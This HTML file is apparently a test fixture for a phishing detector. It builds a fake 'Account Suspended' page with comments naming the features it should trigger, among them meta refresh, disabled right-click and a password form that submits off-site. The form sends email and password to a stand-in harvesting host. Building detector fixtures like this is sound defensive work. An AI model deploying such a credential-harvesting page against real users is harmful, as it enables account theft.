<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Account Suspended</title>
  <!-- External favicon → favicon_is_external -->
  <link rel="icon" href="https://cdn.example.com/brand-icon.ico">
  <!-- Meta refresh → has_meta_refresh -->
  <meta http-equiv="refresh" content="60;url=https://malicious-collector.example.com/timeout">
</head>
<!-- Right-click disabled → right_click_disabled -->
<body oncontextmenu="return false">
  <!-- Thin page (<500 chars body text) → thin_page_with_login -->
  <h1>Your Account Has Been Suspended</h1>
  <p>Verify your identity to restore access.</p>

  <!-- Form submits to external domain → password_form_submits_external + has_password_field -->
  <form action="https://malicious-collector.example.com/harvest" method="POST">
    <input type="email" name="email" placeholder="Email address">
    <input type="password" name="password" placeholder="Password">
    <button type="submit">Verify Now</button>
  </form>
</body>
</html>
